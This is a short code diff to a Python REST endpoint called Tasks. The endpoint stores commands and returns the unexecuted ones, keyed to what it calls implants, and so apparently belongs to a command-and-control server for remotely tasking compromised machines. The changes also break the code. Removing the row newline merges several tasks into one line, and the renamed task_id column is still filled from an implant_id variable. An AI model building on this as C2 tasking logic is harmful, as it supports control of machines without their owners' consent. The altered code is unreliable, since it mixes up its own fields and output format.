@@ -7,7 +7,7 @@ class Tasks(Resource):
         try:
             conn = get_db_connection()
             cursor = conn.cursor()
-            cursor.execute("SELECT implant_id,command FROM tasks WHERE executed IS NOT 1")
+            cursor.execute("SELECT task_id,command FROM tasks WHERE executed IS NOT 1")
             rows = cursor.fetchall()
 
             # Convert the rows to a CSV string
@@ -15,7 +15,7 @@ class Tasks(Resource):
 
             if rows:
                 for row in rows:
-                    csv_string += ",,".join(map(str, row)) + "\n"
+                    csv_string += ',,'.join(map(str, row))
 
             conn.close()
 
@@ -34,7 +34,7 @@ class Tasks(Resource):
             print(data[1])
             conn = get_db_connection()
             cursor = conn.cursor()
-            cursor.execute("INSERT INTO tasks (implant_id, command) VALUES (?, ?)", (implant_id, command))
+            cursor.execute("INSERT INTO tasks (task_id, command) VALUES (?, ?)", (implant_id, command))
             conn.commit()
             conn.close()
             return "Task added successfully!", 201
